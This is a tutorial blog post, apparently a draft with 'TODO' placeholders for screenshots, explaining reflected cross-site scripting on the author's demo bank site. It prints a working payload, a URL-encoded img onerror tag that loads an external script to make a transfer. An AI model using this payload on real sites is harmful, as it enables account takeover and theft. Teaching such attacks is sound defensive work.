This is the second post in my [Web Security 101](/tag/security/) series. If you've read my introduction to CSRF, some of the preamble below might look familiar... feel free to skip ahead a bit.

## Setting the Scene

Picture this: you're a responsible, hardworking person. You've saved up your money over the years at **Definitely Secure Bank®**.

![The Definitely Secure Bank logo.](./media-link/csrf-post/dsb.svg)

You love Definitely Secure Bank - they've always been good to you, plus they make it easy to transfer money and more via their website. Sweet, right?

To get in character, let's have you open up your online banking portal and look around. <b><a href="https://dsb.victorzhou.com/login" target="_blank">Click here to open Definitely Secure Bank's website</a></b> and login. Use **any username** and **any password** you want (don't worry - it's _definitely_ secure). Keep that tab open for the rest of this post.

Once you've logged in, you should see a landing page that looks something like this:

TODO

Click the **"Try searching for the answer"** link. That will bring you to the Search page. Try searching for anything:

TODO

Interesting.

## One Fateful Day...

...you get an email titled: **FREE 🎁 iPhone giveaway!!!**

You open the email and click the link: **[Claim your free iPhone](
https://dsb.victorzhou.com/search?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost%3A8000%2Fxss-demo.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3E)**.

> Yes, I actually want you to click this link for the purposes of the demo.

Assuming you were logged in to Definitely Secure Bank (DSB), you should see something like this:

TODO

It's a little weird that it took you to your bank's website, but it just seems like a broken link, right? Nothing to worry about?

Click back to your DSB homepage, and you should see a new transfer:

TODO

How did that happen?!

## How It Happened

The key vulnerability here is that the DSB search results page **echoes the search query without sanitizing it**. Remember this screenshot from earlier?

TODO

Notice how the search query ("TODO") is echoed back onto the page: _Unfortunately, no results were found for **TODO**_. What if our search query was a valid HTML string, like `html›<a href="https://victorzhou.com">test</a>`?

TODO

Woah. That seems insecure, doesn't it?

Let's look at that specific attack from earlier. The attacker's link linked to a URL of this format:

https://dsb.victorzhou.com/search?q=SEARCH_QUERY_HERE

Aha! That's a link to the DSB search results page. The value of `SEARCH_QUERY_HERE` was the following string:

```
%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost%3A8000%2Fxss-demo.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3E
```

Looks like nonsense, right? Turns out, when you [URL decode](https://www.quora.com/What-is-URL-encoding-and-decoding) this, you get:

```
<img src="#" onerror="const a=document.createElement('script');a.src='http://localhost:8000/xss-demo.js';document.body.appendChild(a);" />
```

Seems a little more familiar now, doesn't it? Let me syntax highlight that for you:

```html
<img src="#" onerror="const a=document.createElement('script');a.src='http://localhost:8000/xss-demo.js';document.body.appendChild(a);" />
```

It's an image tag sourced from `"#"`, which errors and runs the Javascript code contained in the `onerror`! Here's what the `onerror` code looks like after prettify-ing it:

```js
const a = document.createElement('script');
a.src = 'https://victorzhou.com/xss-demo.js';
document.body.appendChild(a);
```
